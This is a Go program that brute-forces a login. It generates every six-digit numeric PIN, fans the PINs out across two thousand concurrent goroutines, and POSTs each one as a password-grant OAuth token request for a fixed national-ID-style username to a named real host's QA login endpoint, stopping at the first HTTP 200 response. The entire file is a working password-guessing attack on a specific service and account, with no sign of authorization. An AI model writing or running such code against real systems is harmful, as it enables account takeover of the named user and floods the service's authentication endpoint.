package main

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

type User struct {
	Username string
	Password string
}

type ResponseBruteForce struct {
	Err        error
	StatusCode int
	Body       string
	User
}

var m sync.Mutex

func main() {
	init := time.Now().UnixMilli()
	pagesChannel := make(chan *[]string)
	responseChannel := make(chan *[]ResponseBruteForce)

	totalElements := 1_000_000
	elementsPerPage := 500
	qtdPages := totalElements / elementsPerPage
	fmt.Println(qtdPages)

	pages := make([][]string, 0)
	fmt.Println(pages)

	for i := 0; i < qtdPages; i++ {
		start := i * elementsPerPage
		end := start + elementsPerPage
		if start == 0 {
			start++
		}
		if end == totalElements {
			end++
		}
		//fmt.Printf("Page: %d, start: %d, end: %d\n", i, start, end)
		go populatePage(pagesChannel, start, end)
	}

	for i := 0; i < qtdPages; i++ {
		appendPasswords(&pages, <-pagesChannel)
	}

	fmt.Printf("Pages: %d\n", len(pages))
	totalSize := 0
	for i, page := range pages {
		pageSize := len(page)
		totalSize += pageSize
		fmt.Printf("Page '%d', size: %d\n", i, pageSize)
		//for _, element := range page {
		//	fmt.Printf("%s, ", element)
		//}
		//fmt.Println()
	}
	fmt.Printf("Total populated elements: %d\n", totalSize)
	fmt.Printf("Total time in millis: %d ms\n", time.Now().UnixMilli()-init)

	for _, page := range pages {
		//fmt.Printf("Page: %d, elements: %v\n\n", i, page)
		go bruteForce(&responseChannel, "64735569073", page)
	}

	count := 0
	for i := 0; i < len(pages); i++ {
		responses := <-responseChannel
		for _, response := range *responses {
			count++
			if response.StatusCode == 200 {
				fmt.Printf("\n")
				syscall.Exit(0)
			} else {
				//fmt.Printf("Username: %s, password: %s, StatusCode: %d,\nBody: %v, Error: %v\n\n",
				//	response.Username, response.Password, response.StatusCode, response.Body, response.Err)
				fmt.Printf("%s\n", response.Password)
			}
		}
	}
	fmt.Printf("Total elements verify: %d\n\n", count)
	fmt.Printf("Total time in minutes: %.3f m\n", float64(time.Now().UnixMilli()-init)/60_000.0)
}

func populatePage(channel chan *[]string, start int, end int) {
	passwords := make([]string, 0)
	for ; start < end; start++ {
		passwords = append(passwords, fmt.Sprintf("%06d", start))
	}
	channel <- &passwords
}

func appendPasswords(pagePasswords *[][]string, passwords *[]string) {
	m.Lock()
	defer m.Unlock()
	*pagePasswords = append(*pagePasswords, *passwords)
}

func bruteForce(channel *chan *[]ResponseBruteForce, username string, passwords []string) {
	var responses []ResponseBruteForce
	client := http.Client{}
	data := url.Values{}
	data.Set("username", username)
	data.Set("client_id", "telerisco-app-front")
	data.Set("grant_type", "password")
	for _, password := range passwords {
		data.Set("password", password)
		encodedData := data.Encode()
		req, err := http.NewRequest("POST", "https://app-qa.telerisco.com.br/login-usuario/auth/token", strings.NewReader(encodedData))
		if err != nil {
			responses = append(responses, ResponseBruteForce{
				Err:        err,
				StatusCode: 500,
				Body:       "",
				User: User{
					Username: username,
					Password: password,
				},
			})
			continue
		}
		req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Add("Content-Length", strconv.Itoa(len(encodedData)))
		responses = append(responses, callEndpoint(username, password, client, req))
	}
	*channel <- &responses
}

func callEndpoint(username string, password string, client http.Client, req *http.Request) ResponseBruteForce {
	fmt.Printf("Request token: Username: %s, password: %s\n", username, password)
	response, err := client.Do(req)
	if err != nil {
		return ResponseBruteForce{
			Err:        err,
			StatusCode: 500,
			Body:       "",
			User: User{
				Username: username,
				Password: password,
			},
		}
	}
	defer func(Body io.ReadCloser) {
		err := Body.Close()
		fmt.Printf("Response token: Username: %s, password: %s, StatusCode: %d\n", username, password, response.StatusCode)
		if err != nil {
			fmt.Printf("Error: %v\n", err)
		}
	}(response.Body)
	b, err := io.ReadAll(response.Body)
	if err != nil {
		return ResponseBruteForce{
			Err:        err,
			StatusCode: 500,
			Body:       "",
			User: User{
				Username: username,
				Password: password,
			},
		}
	}
	return ResponseBruteForce{
		Err:        nil,
		StatusCode: response.StatusCode,
		Body:       string(b),
		User: User{
			Username: username,
			Password: password,
		},
	}
}
